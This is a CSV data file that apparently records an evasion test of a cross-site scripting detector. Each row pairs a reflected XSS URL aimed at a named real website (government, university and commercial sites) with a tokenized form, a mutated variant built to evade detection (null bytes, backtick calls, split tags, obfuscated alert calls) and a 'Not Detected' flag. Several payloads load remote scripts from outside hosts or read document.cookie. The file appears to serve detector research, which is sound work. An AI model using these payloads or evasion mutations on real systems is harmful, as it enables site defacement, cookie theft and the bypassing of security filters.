Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://www.manskligarattigheter.gov.se/extra/pod/?id=53&amp;module_instance=3&amp;action=pod_show&amp;navid=--%3<br>e%3cscript%3ealert(123)%3c/script%3e,"[['http://u', 'None', 'action=', 'None', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.manskligarattigheter.gov.se/extra/pod/?id=53&amp;module_instance=3&amp;action=pod_show&amp;navid=--%3<br e<br /drfv/alert`123`%3c/script%3e,"[['http://u', 'None', 'action=', 'None', 'None']]",True
http://op-webtools.web.cern.ch/op-webtools/vistar/vistars.php?usr=psb&quot;&gt;&lt;script&gt;alert(document.cookie<br>)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://op-webtools.web.cern.ch/op-webtools/vistar/vistars.php?usr=psb&quot;&lt;%00script&gt;alert`document.cookie<br%00>`&lt;%00/script&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.netixir.com/default.asp?page=search&amp;kelime=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.netixir.com/default.asp?page=search&amp;kelime=&quot;&lt;%00script%00%00%00&lt;%00%00%00script%00&gt;alert`document.cookie`&lt;%00/script%00%00%00&lt;%00/script%00%00%00&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.communities.gov.uk/search/error.asp?start=0&amp;perpage=10&amp;col=odpm&amp;summary=yes&amp;sort=rank&amp;dat<br>e1=&amp;date2=&amp;category=&amp;doctype=&amp;type=&amp;search=%3e%22%3e%3cscript%3ealert('norehem%20was%20here!!')%3c/s<br>cript%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c<br>/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br>%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,"[['http://u', 'None', 'None', 'None', 'sort=', 'None', 'None', 'category=', 'None', 'type=', 'search=', '>', '>', '<script>', 'alert(', ')', '</script>', '<h0>', '<h0>', '<h0>', '<marquee>', '</marquee>', '</h0>', '</h0>', '</h0>', '<center>', '<img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu0.gif"">', '</center>', '<iframe', 'src=', 'http://jersain']]",http://www.communities.gov.uk/search/error.asp?start=0&amp;perpage=10&amp;col=odpm&amp;summary=yes&amp;sort=rank&amp;dat<br e1=&amp;date2=&amp;category=&amp;doctype=&amp;type=&amp;search=%3e%22%3e%3cscript%00%3e%3cscript%00%3etop[/al/.source+/ert/.source/]`1``norehem%20was%20here!!`%3c/s<br cript%00%3e%3c/s<br cript%00%3e%3ch1%00%3e%3ch1%00%3e%3c%00h1%3e%3c%00h1%3e%3ch1%00%3e%3ch1%00%3e%3c%00marquee%3e%3c%00marquee%3enorehem%20was%20here%3c/marquee%00%3e%3c/marquee%00%3e%3c/h1%00%3e%3c/h1%00%3e%3c/h1%00%3e%3c/h1%00%3e%3c<br %00/h1%3e%3c<br %00/h1%3e%3c%00center%3e%3c%00center%3e%3c%00img%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br %22%3e%3c%00img%20src=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br %22%3e%3c%00/center%3e%3c%00/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,"[['http://u', 'None', 'None', 'None', 'sort=', 'None', '>', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', '<iframe', 'src=', 'http://jersain']]",False
http://www.legistdf.gov.ar/lp/presidencia/index.php?dir=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3<br>c/script%3e,"[['http://u', '>', '<script>', 'alert(', '/ar0sw0rmed/', ')', '</script>']]",http://www.legistdf.gov.ar/lp/presidencia/index.php?dir=%22%3c%00%00%00script%00%00%3ealert%28/ar3sw0rmed/%29;%3<br%00%00%00%00%00>c/script%3e,"[['http://u', 'None', 'alert(', '/ar0sw0rmed/', ')', 'None', '>']]",False
http://publications.oxfam.org.uk/oxfam/adv-search.asp?tag=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://publications.oxfam.org.uk/oxfam/adv-search.asp?tag=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.j-gate.informindia.co.in/librarian/publisher.asp?alphabet=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(doc<br>ument.cookie)&lt;/script&gt;,"[['http://u', '</textarea>', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.j-gate.informindia.co.in/librarian/publisher.asp?alphabet=&lt;%00/textarea%00&gt;'&quot;&lt;%00script%00&gt;alert`doc<br%00%00>ument.cookie`&lt;%00/script%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.maths.tcd.ie/emis/journals/lrg/about/search.html%27%22%3e%3c/title%3e%3cscript%3ealert(13<br>37)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://www', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.maths.tcd.ie/emis/journals/lrg/about/search.html%27%22%3c/title%3cscript%3ealert`13<br 37`%3c/script%3e%3cmarquee%3ch1%3exss%20by%20xylitol%3c/h1%3c/marquee%3e,"[['http://www', 'None', 'None', 'None', 'None']]",True
http://www.videogame.it/shop/default.asp?act=search&amp;search=&quot;&gt;&lt;img<br>src=&quot;http://img96.imageshack.us/img96/8009/xssks5.jpg&quot;&gt;,"[['http://u', 'search=', '>', 'None']]",http://www.videogame.it/shop/default.asp?act=search&amp;search=&quot;&lt;img<br%00 src=&quot;http://img96.imageshack.us/img96/8009/xssks5.jpg&quot;&gt;,"[['http://u', 'search=', 'None']]",True
http://www.okazii.ro/cautare/%3cxss%3e.html?s=%3cscript%20src=http://crakeru.007webpro.com/xss.js%3e<br>%3c/script%3e&amp;x=0&amp;y=0,"[['http://u', 'None', '</script>', 'x=', 'y=']]",http://www.okazii.ro/cautare/%3cxss%3e.html?s=%3cscript%20src=http://crakeru.007webpro.com/xss.js%3e<br %3c/script%3e&amp;x=0&amp;y=0,"[['http://u', 'None', 'None', 'x=', 'y=']]",True
https://www.oberon-media.com/checkout/dualcheckout/checkout12.htm?code=111190330&amp;channel=110130270&amp;r<br>efid=1000&amp;orign=%22%27--%3e/%3e%3cscript%3ealert(-1)%3c/script%3e&amp;ln=fr&amp;billingcountry=%22%27--%3e/%<br>3e%3cscript%3ealert(-1)%3c/script%3e&amp;lc=fr&amp;gamecodedate=%22%27--%3e/%3e);%3c/script%3e%3cscript%3eal<br>ert(-1);%3c/script%3e,"[['http://u', 'None', 'None', 'None', '>', '>', '<script>', 'alert(', 'None', ')', '</script>']]",https://www.oberon-media.com/checkout/dualcheckout/checkout12.htm?code=111190330&amp;channel=110130270&amp;r<br><br>efid=1000&amp;orign=%22%27--%3e/%3cscript<script>/drfv//drfv/alert`-1`%3c/script%3c/script%3e&amp;ln=fr&amp;billingcountry=%22%27--%3e/%<br><br>3e%3cscript<script>/drfv//drfv/alert`-1`%3c/script%3c/script%3e&amp;lc=fr&amp;gamecodedate=%22%27--%3e/%3e`;%3c/script%3c/script%3cscript<script>/drfv//drfv/al<br><br>ert`-1`;%3c/script%3c/script%3e,"[['http://u', 'None', 'None', 'None', '>', 'None', 'None', 'None', 'None', '>', '>', 'None', 'None', 'None', 'None', '>', '>', 'None', 'None']]",False
http://www.trafic.ro/cauta/?q=%3ciframe%20width=800%20height=330%20src=http://droptix.itrello.com/xs<br>s.php%3e&amp;cat=general&amp;type=all&amp;x=0&amp;y=0,"[['http://u', 'None', 'cat=', 'type=', 'x=', 'y=']]",http://www.trafic.ro/cauta/?q=%3ciframe%20width=800%20height=330%20src=http://droptix.itrello.com/xs<br>s.php%3e&amp;cat=general&amp;type=all&amp;x=0&amp;y=0,"[['http://u', 'None', 'cat=', 'type=', 'x=', 'y=']]",True
http://www.theregoesthebride.com/c.cfm?s=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.theregoesthebride.com/c.cfm?s=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://community.hereignsnetwork.com/service/searcheverything.kickaction?keywords=&quot;&gt;&lt;script&gt;alert(1)<br>;&lt;/script&gt;&amp;includevideo=on&amp;includeaudio=on&amp;includephoto=on&amp;includeblog=on&amp;includeuser=on&amp;includegrou<br>ps=on&amp;includemessages=on&amp;as=83239,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",http://community.hereignsnetwork.com/service/searcheverything.kickaction?keywords=&quot;&lt;script&lt;script&gt;alert`1`<br><br>;&lt;/script&lt;/script&gt;&amp;includevideo=on&amp;includeaudio=on&amp;includephoto=on&amp;includeblog=on&amp;includeuser=on&amp;includegrou<br><br>ps=on&amp;includemessages=on&amp;as=83239,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.muslumanturk.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', 'strkey=', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.muslumanturk.com/search.asp?mtd=1&amp;strkey=&quot;&lt;script%00&gt;alert`&quot;backdoor&quot;`&lt;/script%00&gt;,"[['http://u', 'strkey=', 'None', 'None']]",True
http://www.dlink.es/cs/satellite?c=page&amp;childpagename=dlinkeurope-es%2fdlgeneric&amp;cid=1197370344419&amp;p<br>=1197370344419&amp;packedargs=category%3dquickproductfinder%26locale%3d1195806681347%26renderstyle%3derr<br>orproductsearch%26term%3d%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e&amp;pagenam<br>e=dlinkeurope-es%2fdlwrapper,"[['http://u', 'None', 'cid=', 'p=', 'None', 'category=', 'None', 'None', 'term=', 'None']]",http://www.dlink.es/cs/satellite?c=page&amp;childpagename=dlinkeurope-es%2fdlgeneric&amp;cid=1197370344419&amp;p<br>=1197370344419&amp;packedargs=category%3dquickproductfinder%26locale%3d1195806681347%26renderstyle%3derr<br>orproductsearch%26term%3d%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e&amp;pagenam<br>e=dlinkeurope-es%2fdlwrapper,"[['http://u', 'None', 'cid=', 'p=', 'None', 'category=', 'None', 'None', 'term=', 'None']]",True
http://www.ci.el-paso.tx.us/redirect2.asp?&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,"[['http://www', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.ci.el-paso.tx.us/redirect2.asp?&quot;&lt;script%00&gt;alert`1`;&lt;%00/script&gt;,"[['http://www', 'None', 'None']]",True
http://webmail.defensoria.to.gov.br/index.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>']]",http://webmail.defensoria.to.gov.br/index.php?a[]=%3c%00script%3ealert`/xssed_by_omeha/`;%3c%00/script%3e%<br 3cscript%3ealert`document.cookie`;%3c%00/script%3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://cars.mlogic.mobi/vehicle_search_step1.jsp?a=m&amp;type=used%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', 'type=', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://cars.mlogic.mobi/vehicle_search_step1.jsp?a=m&amp;type=used%27%22%3c%00/title%3c%00script%3ealert<br%00 (1337)%3c%00/script%3c%00marquee%3c%00h1%3exss%20by%20xylitol%3c/h1%00%3c/marquee%00%3e,"[['http://u', 'type=', 'None', 'None', 'None']]",True
http://www.e-hack.org/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3ealert(<br>document.cookie)%3b%3c/script%3e,"[['http://u', 'item=', 'None', '>', '>', '<script \n\r>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.e-hack.org/index.php?action=search&amp;item=content&amp;blog=%3e%22%3cscript%20%0a%0d%00%3ealert(<br%00 document.cookie)%3b%3c/script%00%3e,"[['http://u', 'item=', 'None', '>', 'None', 'alert(', 'None']]",False
http://3.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",http://3.tool.ms/login.cgi?id=%3e%22%3cscript/src=http://kusomiso.com/xss.js%3c%00/script%3e,"[['http://u', '>', 'None']]",False
http://www.zadkine.nl/smartsite25.html?cat=2&quot;&gt;&lt;script&gt;alert%20(/killer-tr/)&lt;/script&gt;&lt;h1&gt;killer-tr&lt;/h<br>1&gt;,"[['http://u', '>', '<script>', 'None', ')', '</script>', '<h0>', '</h0>']]",http://www.zadkine.nl/smartsite25.html?cat=2&quot;&lt;%00script%00%00&lt;%00script%00%00&gt;alert%20`/killer-tr/`&lt;%00/script%00%00&lt;%00/script%00%00&lt;%00h1%00%00&lt;%00h1%00%00&gt;killer-tr&lt;%00/h<br%00%00 1&lt;%00/h<br%00%00 1&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.idlewords.net/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.idlewords.net/phpinfo.php?a[]=%22%3cscript%00%3ealert`document.cookie`%3c%00/script%3e,"[['http://u', 'None', 'None']]",True
http://hypedesigns.com/?rid=file:%0acontent-type:%20text/html;charset=utf-7%0a%0a%2badw-script%2bad4<br>-alert(%27xss%27);%2badw-/script%2bad4-,"[['http://u', 'None', 'type:', 'charset=', 'alert(', ""'xss'"", ')']]",http://hypedesigns.com/?rid=file:%0acontent-type:%20text/html;charset=utf-7%0a%0a%2badw-script%2bad4<br%00%00><br%00%00>-top[al+ert]`1``%27xss%27`;%2badw-/script%2bad4-,"[['http://u', 'None', 'type:', 'charset=', 'None', 'None', ""'xss'""]]",False
http://information.com/search/index.html?cat=1&amp;keyword=%22%3e%3cscript%3ealert(%22zuppergazi%22)%3c/<br>script%3e,"[['http://u', 'keyword=', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://information.com/search/index.html?cat=1&amp;keyword=%22%3cscript%00%3cscript%00%3ealert`%22zuppergazi%22`%3c/<br%00 script%3c/<br%00 script%3e,"[['http://u', 'keyword=', 'None', 'None']]",True
http://www.jelco.ca/en/product_detail.php?id=2%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.jelco.ca/en/product_detail.php?id=2%22%3cscript%3ealert%28document.cookie%29%3c/script%3e,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",False
http://www.fee.rs.gov.br/sitefee/pt/content/resumo/pg_municipios_detalhe.php?municipio=%22%3e'%3e%3c<br>script%20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script src=http://vuln.xssed.net/thirdparty/scripts/python0.js>', '</script>']]",http://www.fee.rs.gov.br/sitefee/pt/content/resumo/pg_municipios_detalhe.php?municipio=%22%3c<br>script%20src=http://vuln.xssed.net/thirdparty/scripts/python5.js%3c/script%3e,"[['http://u', 'None']]",True
http://www.compumundo.com.ar/2007/listado.php?busq=&lt;script&gt;alert(/xss/);&lt;/script&gt;,"[['http://u', '<script>', 'alert(', '/xss/', ')', '</script>']]",http://www.compumundo.com.ar/2007/listado.php?busq=&lt;script%00&gt;alert`/xss/`;&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.szboftec.gov.cn/download/test.php3?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>']]",http://www.szboftec.gov.cn/download/test.php3?a[]=%3cscript%00%3ealert`/xssed_by_omeha/`;%3c%00/script%3e%<br%00 3cscript%3ealert`document.cookie`;%3c%00/script%3e,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://help.travian.ro/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b<br>%3c%2fscript%3e,"[['http://u', 'None', '>', '<script>', 'alert(', ')', '</script>']]",http://help.travian.ro/index.php?type=faq&amp;mod=%22<script /drfv//drfv/alert%28%2fxss+by+redtuning%2f%29%3b<script %3c%2fscript%3e,"[['http://u', 'None', 'None']]",True
http://www.web-relevant.com/blogs/cfobjective/index.cfm?mode=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.web-relevant.com/blogs/cfobjective/index.cfm?mode=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.cesr.eu/index.php?page=groups&amp;mac=0&amp;id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'None', 'id=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.cesr.eu/index.php?page=groups&amp;mac=0&amp;id=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/script&lt;marquee<br &lt;h1&gt;by+narcoticxs&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'None', 'id=', 'None', 'None', 'None']]",True
http://www.mytelus.com/search/results.do?p=web&amp;q=%22%3e%3cscript+src%3d%27http%3a//freewebs.com/skun<br>kf00t/x.js%27.%3c/script%3e%3c%21--,"[['http://u', 'q=', '>', 'None', '<!--']]",http://www.mytelus.com/search/results.do?p=web&amp;q=%22%3cscript+src%3d%27http%3a//freewebs.com/skun<br kf00t/x.js%27.%3c/script%3c%21--,"[['http://u', 'q=', '<script', 'src=', 'None', 'None', 'None']]",False
http://www.avm.de/partneravm/marketing/fritz_clips/start_clip.php?clip='%3e%3c/noscript%3e%3cscript%<br>20src=http://ha.ckers.org/xss.js%3e%3c/script%3e,"[['http://u', '>', 'None', '<script src=http://ha.ckers.org/xss.js>', '</script>']]",http://www.avm.de/partneravm/marketing/fritz_clips/start_clip.php?clip='%3c/noscript%3cscript%<br>20src=http://ha.ckers.org/xss.js%3c/script%3e,"[['http://u', 'None']]",True
http://www.pubblicizzasito.net/search.php?what=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%2<br>9%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharc<br>ode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3<br>c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e<br>&amp;search_top.x=0&amp;search_top.y=0&amp;search_top=go,"[['http://u', 'alert(', 'string.fromcharcode(', '0,0,0))//\';alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//"";alert(string.fromcharcode(0,0,0))//--></script>"">\'><script>alert(string.fromcharcode(0,0,0)', ')', '</script>', 'x=', 'y=', 'None']]",http://www.pubblicizzasito.net/search.php?what=%27%3btop[8680439.toString(30)](1)%28string.fromcharcode%2888%2c83%2c83%29%2<br%00 9%2f%2f%5c%27%3btop[8680439.toString(30)](1)%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3btop[8680439.toString(30)](1)%28string.fromcharc<br%00 ode%2888%2c83%2c83%29%29%2f%2f%5c%22%3btop[8680439.toString(30)](1)%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3<br%00 c%2fscript%3e%22%3e%27%3e%3c%00script%3etop[8680439.toString(30)](1)%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%00%3e<br%00 &amp;search_top.x=0&amp;search_top.y=0&amp;search_top=go,"[['http://u', 'None', 'None', ')', 'None', 'None', '>', '>', 'None', 'None', 'None', ')', 'None', 'None', 'x=', 'y=', 'None']]",False
http://eur-lex.europa.eu/result.do?arg0=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%3c<br>h1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e&amp;arg1=%3ca%20onmouseover=alert(/st@r-gaz3r/)%3e;)%3ca/%3e&amp;arg2<br>=%3ca%20onmouseover=alert(/st@r-gaz3r/)%3e;)%3ca/%3e&amp;titre=titre&amp;chlang=en&amp;rechtype=rech_mot&amp;submit=<br>search,"[['http://u', '<script>', 'alert(', '/st@r-gaz0r/', ')', '</script>', '<marquee>', '<h0>', '</h0>', '</marquee>', 'None', 'None', ')', 'None', 'None', 'None', ')', 'None', 'None', 'None', 'None', 'submit=']]",http://eur-lex.europa.eu/result.do?arg0=%3c%00script%3ealert`/st@r-gaz3r/`%3c/script%3cmarquee%3c<br h1%00%3est@r-gaz3r%3c%00/h1%3c/marquee%3e&amp;arg1=%3ca%20onmouseover=alert`/st@r-gaz3r/`%00%3e;`%3ca/%00%3e&amp;arg2<br =%3ca%20onmouseover=alert`/st@r-gaz3r/`%00%3e;`%3ca/%00%3e&amp;titre=titre&amp;chlang=en&amp;rechtype=rech_mot&amp;submit=<br search,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'submit=', 'None']]",True
http://www.citruscollege.edu/apps/pubs.asp?q=1&amp;t=&lt;script&gt;alert(&quot;scriptorium(turkey)hackhaber.com&quot;)&lt;/<br>script&gt;,"[['http://u', 't=', '<script>', 'alert(', '""scriptorium(turkey)hackhaber.com""', ')', '</script>']]",http://www.citruscollege.edu/apps/pubs.asp?q=1&amp;t=&lt;script%00&gt;alert`&quot;scriptorium`turkey`hackhaber.com&quot;`&lt;/<br>script%00&gt;,"[['http://u', 't=', 'None', 'None']]",True
http://www.fidofinder.com/lost-dogs.php?citystate=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.fidofinder.com/lost-dogs.php?citystate=&quot;&lt;script%00&gt;alert`1`;&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.gitarakor.com/ara.asp?q=&lt;script&gt;alert('drakula')&lt;/script&gt;://,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>']]",http://www.gitarakor.com/ara.asp?q=&lt;%00script&gt;&lt;%00script&gt;alert`'drakula'`&lt;/script%00&gt;&lt;%00/script&gt;://,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://www.armenianreality.com/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?op<br>tion=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=ht<br>tp://xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",http://www.armenianreality.com/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php?op<br tion=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=ht<br tp://xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'None', 'None', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'None', 'None']]",True
http://www.clago.ca/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/<br>marquee&gt;,"[['http://u', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.clago.ca/igallery.asp?d=&quot;&lt;script%00&gt;alert`xss`&lt;/script%00&gt;&lt;marquee&lt;h1%00&gt;by+narcoticxs&lt;%00/h1&lt;/<br>marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.travelingpanties.com/member/profile.php?profile_id=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.travelingpanties.com/member/profile.php?profile_id=&quot;&lt;script%00&gt;alert`&quot;backdoor&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.olgunarmut.com/buff10/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.olgunarmut.com/buff10/login.asp?folder=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;&lt;marquee<br%00 &lt;h1&gt;by+narcoticxs&lt;/h1&lt;%00/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.fema.gov/goodbye/goodbye.jsp?url=%3cscript%3ealert%28%22geewiz%22%29%3c%2fscript%3e,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>']]",http://www.fema.gov/goodbye/goodbye.jsp?url=<sc%00ript /drfv/alert%28%22geewiz%22%29%3c%2fscript%00%3e,"[['http://u', 'None']]",True
http://wwwww.observatoire-pesticides.gouv.fr/index.php?pageid=1260&amp;parentid=619&quot;&gt;&lt;script&gt;alert(1)&lt;/s<br>cript&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://wwwww.observatoire-pesticides.gouv.fr/index.php?pageid=1260&amp;parentid=619&quot;&lt;script%00&gt;alert`1`&lt;/s<br%00 cript&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.siyahkahve.com/index.php?cmd=7&amp;textid=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie<br>)%3b%3c/script%3e,"[['http://u', 'None', '>', '>', '<script \n\r>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.siyahkahve.com/index.php?cmd=7&amp;textid=%3e%22%3cscript%20%0a%0d%00%3cscript%20%0a%0d%00%3ealert`document.cookie<br `%3b%3c%00/script%3c%00/script%3e,"[['http://u', 'None', '>', 'None', 'None']]",False
